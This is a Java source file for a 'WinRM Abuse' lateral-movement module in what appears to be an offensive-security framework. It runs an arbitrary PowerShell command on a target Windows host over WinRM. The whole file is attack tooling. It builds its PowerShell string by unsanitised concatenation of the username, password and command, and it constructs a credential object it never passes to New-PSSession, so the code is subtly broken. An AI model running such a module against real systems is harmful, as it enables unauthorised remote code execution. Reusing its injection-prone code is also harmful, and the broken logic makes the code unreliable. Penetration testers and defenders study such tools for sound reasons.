package com.jabber.jabber.modules.lateral;

import com.jabber.jabber.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JABBERModule(id="lateral-winrm",name="WinRM Abuse",description="Lateral movement via Windows Remote Management (WinRM) exploitation",category=Category.LATERAL_MOVEMENT,riskLevel=RiskLevel.HIGH,sourceRef="WinRM",author="JABBER")
public class WinRMModule implements JABBERModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.text("target_host","Target Host").required().placeholder("server.domain.com").group("Target"),
            ModuleInputField.text("port","Port").placeholder("5985").group("Connection"),
            ModuleInputField.select("port_type","Port Type",List.of("http-5985","https-5986")).group("Connection"),
            ModuleInputField.text("username","Username").placeholder("domain\\username").group("Credentials"),
            ModuleInputField.text("password","Password").placeholder("Password123!").group("Credentials"),
            ModuleInputField.text("command","PowerShell Command").required().placeholder("whoami; Get-ComputerInfo").group("Payload"),
            ModuleInputField.checkbox("ssl_verify","Verify SSL").group("Options"),
            ModuleInputField.text("advanced_options","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"lateral-winrm");
            try{
                String target=input.getOrDefault("target_host","");
                String portType=input.getOrDefault("port_type","http-5985");
                String user=input.getOrDefault("username","");
                String passwd=input.getOrDefault("password","");
                String cmd=input.getOrDefault("command","");

                if(target.isEmpty()||cmd.isEmpty()){
                    result.fail("Required parameters missing");return result;
                }

                String port=portType.contains("5986")?"5986":"5985";
                String protocol=portType.contains("https")?"https":"http";

                ctx.log("[*] WinRM Lateral Movement Starting...");
                ctx.log("[*] Target: "+target+":"+port+" ("+protocol+")");
                ctx.log("[*] Authentication: "+(user.isEmpty()?"Current user":user));
                ctx.reportProgress(15);

                if(!testWinRM(target,port,protocol)){
                    result.fail("WinRM not accessible");return result;
                }
                ctx.log("[+] WinRM service accessible");
                ctx.reportProgress(35);

                String output=executeRemote(target,port,protocol,user,passwd,cmd);
                if(output==null){
                    result.fail("Remote execution failed");return result;
                }
                ctx.log("[+] Command executed successfully");
                ctx.reportProgress(80);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("target",target);
                findings.put("port",port);
                findings.put("protocol",protocol);
                findings.put("command",cmd);
                findings.put("output",output.length()>500?output.substring(0,500):output);
                findings.put("lateral_access","Obtained via WinRM");
                findings.put("impact","Remote code execution via PowerShell Remoting");
                findings.put("remediation","Restrict WinRM access, disable if unused, enable logging, restrict user permissions, use MFA");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private boolean testWinRM(String host,String port,String proto){
        try{
            String url=proto+"://"+host+":"+port+"/wsman";
            Process p=Runtime.getRuntime().exec(new String[]{"powershell","-Command","Test-WSMan -ComputerName "+host+" -Port "+port});
            return p.waitFor()==0;
        }catch(Exception e){return false;}
    }

    private String executeRemote(String host,String port,String proto,String user,String passwd,String cmd){
        try{
            String ps="$url='"+proto+"://"+host+":"+port+"';"
                    +"$cred=New-Object PSCredential('"+user+"',(ConvertTo-SecureString '"+passwd+"' -AsPlainText -Force));"
                    +"$session=New-PSSession -ComputerName "+host+" -Port "+port+" -UseSSL:$"+proto.equals("https")+";"
                    +"Invoke-Command -Session $session -ScriptBlock {"+cmd+"};";
            Process p=Runtime.getRuntime().exec(new String[]{"powershell","-Command",ps});
            Scanner s=new Scanner(p.getInputStream());
            StringBuilder out=new StringBuilder();
            while(s.hasNextLine())out.append(s.nextLine()).append("\n");
            s.close();
            return out.toString();
        }catch(Exception e){return null;}
    }
}
